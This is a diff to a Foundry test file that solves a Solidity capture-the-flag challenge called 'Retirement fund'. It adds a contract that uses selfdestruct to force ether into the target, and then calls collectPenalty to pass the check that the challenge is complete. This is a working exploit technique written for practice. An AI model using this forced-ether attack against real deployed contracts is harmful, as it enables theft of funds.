@@ -4,7 +4,13 @@ pragma solidity ^0.7.6;
 import "forge-std/Test.sol";
 import "../src/3-Retirement-fund.sol";
 
-// podes meter contratos aca
+contract Bomb {
+    constructor() payable { }
+
+    function kboom(address victim) external {
+        selfdestruct(payable(victim));
+    }
+}
 
 contract Challenge3Test is Test {
     RetirementFundChallenge target;
@@ -19,9 +25,14 @@ contract Challenge3Test is Test {
 
     function testExample() public {
         vm.startPrank(player);
-
+        
         // tu codigo aca
-                
+        Bomb b = new Bomb{value: 1}();
+        b.kboom(address(target));
+        
+        target.collectPenalty();
+        
+        
         assertTrue(target.isComplete());
     }
 }
